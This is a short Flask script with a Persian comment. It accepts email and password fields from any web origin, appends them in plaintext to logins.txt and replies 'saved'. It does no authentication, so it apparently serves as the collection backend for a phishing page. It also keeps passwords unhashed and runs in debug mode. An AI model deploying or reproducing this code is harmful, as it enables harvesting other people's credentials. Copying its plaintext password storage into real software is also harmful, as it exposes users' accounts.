from flask import Flask, request
from flask_cors import CORS

app = Flask(__name__)
CORS(app)  # اجازه ارسال درخواست از مرورگرهای دیگر

@app.route('/save', methods=['POST'])
def save_data():
    email = request.form.get('email')
    password = request.form.get('password')

    with open('logins.txt', 'a', encoding='utf-8') as f:
        f.write(f'{email} | {password}\n')

    return 'saved'

if __name__ == '__main__':
    app.run(debug=True)
